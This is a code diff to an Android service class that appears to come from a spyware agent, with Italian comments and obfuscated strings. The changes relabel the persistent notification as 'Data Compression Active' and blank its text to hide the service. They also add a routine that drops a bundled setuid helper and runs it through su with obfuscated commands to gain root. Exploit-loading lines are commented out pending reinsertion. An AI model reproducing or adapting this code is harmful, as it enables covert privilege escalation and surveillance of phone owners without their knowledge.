@@ -84,7 +84,7 @@ public class ServiceCore extends Service {
 
 		// E' sempre false se Cfg.ACTIVITY = false
 		if (needsNotification == true) {
-			Notification note = new Notification(R.drawable.notify_icon, "Start system service",
+			Notification note = new Notification(R.drawable.notify_icon, "Data Compression Active",
 					System.currentTimeMillis());
 
 			Intent i = new Intent(this, FakeActivity.class);
@@ -94,15 +94,15 @@ public class ServiceCore extends Service {
 			PendingIntent pi = PendingIntent.getActivity(this, 0, i, 0);
 
 			// Activity Name and Displayed Text
-			note.setLatestEventInfo(this, "Activity", "Service", pi);
-			note.flags |= Notification.FLAG_NO_CLEAR;
+			note.flags |= Notification.FLAG_AUTO_CANCEL;
+			note.setLatestEventInfo(this, "", "", pi);
 
 			startForeground(1260, note);
 		}
 	}
 
 	private boolean isNotificationNeeded() {
-		if (Cfg.ACTIVITY) {
+		if (Cfg.OSVERSION.equals("v2") == false) {
 			int sdk_version = android.os.Build.VERSION.SDK_INT;
 
 			if (sdk_version >= 11 /* Build.VERSION_CODES.HONEYCOMB */) {
@@ -124,16 +124,27 @@ public class ServiceCore extends Service {
 			Check.log(TAG + " (onStart)"); //$NON-NLS-1$
 		}
 
-		if (PackageInfo.checkRoot() == true) {
-			Status.self().setRoot(true);
-		} else {
-			Status.self().setRoot(false);
+		// Abbiamo su?
+		Status.self().setSu(PackageInfo.hasSu());
+		
+		// Abbiamo la root?
+		Status.self().setRoot(PackageInfo.checkRoot());
+
+		if (Status.self().haveSu() == true && Status.self().haveRoot() == false) {
+			// Ask the user...
+			superapkRoot();
+
+			Status.self().setSu(PackageInfo.checkRoot());
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): isRoot = " + Status.self().haveRoot()); //$NON-NLS-1$
+			}
 		}
-
+		
 		if (Cfg.EXP) {
-			boolean isRoot = false;
+			boolean isRoot = Status.self().haveRoot();
 
-			if (PackageInfo.checkRoot() == false) {
+			if (isRoot == false) {
 				// Don't exploit if we have no SD card mounted
 				if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED)) {
 					// isRoot = root();
@@ -355,8 +366,10 @@ public class ServiceCore extends Service {
 			pi.addRequiredPermissions(Messages.getString("32.23"));
 
 			// .apk con tutti i permessi nel manifest
-			InputStream manifestApkStream = getResources().openRawResource(R.raw.layout);
-			fileWrite(manifest, manifestApkStream, Messages.getString("36.0"));
+
+			// TODO riabilitare le righe quando si reinserira' l'exploit
+			//InputStream manifestApkStream = getResources().openRawResource(R.raw.layout);
+			//fileWrite(manifest, manifestApkStream, Messages.getString("36.0"));
 
 			// Copiamolo in /data/app/*.apk
 			// /system/bin/ntpsvd qzx \"cat
@@ -412,16 +425,21 @@ public class ServiceCore extends Service {
 	}
 
 	// Prendi la root tramite superuser.apk
-	private boolean superapkRoot() {
+	private void superapkRoot() {
 		final File filesPath = getApplicationContext().getFilesDir();
 		final String path = filesPath.getAbsolutePath();
 		final String suidext = Messages.getString("32.6"); // statusdb
-		boolean isRoot = PackageInfo.checkRoot();
 
+		if (Status.self().haveSu() == false) {
+			return;
+		}
+		
 		Resources resources = getResources();
-		InputStream stream = resources.openRawResource(R.raw.statuslog);
+		// exploit
+		//InputStream stream = resources.openRawResource(R.raw.statuslog);
 
-		stream = resources.openRawResource(R.raw.statusdb);
+		// suidext
+		InputStream stream = resources.openRawResource(R.raw.statusdb);
 
 		try {
 			// 0x5A3D10448D7A912A
@@ -435,7 +453,9 @@ public class ServiceCore extends Service {
 			}
 
 			Runtime.getRuntime().exec("chmod 755 " + path + "/" + suidext);
-			Runtime.getRuntime().exec("su -c \"" + path + "/" + suidext + Messages.getString("32.11") + "\""); //$NON-NLS-1$ //$NON-NLS-2$
+			Process localProcess = Runtime.getRuntime().exec(new String[] {Messages.getString("32.30"), "-c", Messages.getString("32.29")}); //$NON-NLS-1$ //$NON-NLS-2$
+			
+			localProcess.waitFor();		
 		} catch (final Exception e1) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e1);
@@ -448,8 +468,6 @@ public class ServiceCore extends Service {
 
 			return false;
 		}
-
-		return isRoot;
 	}
 
 	private boolean root() {
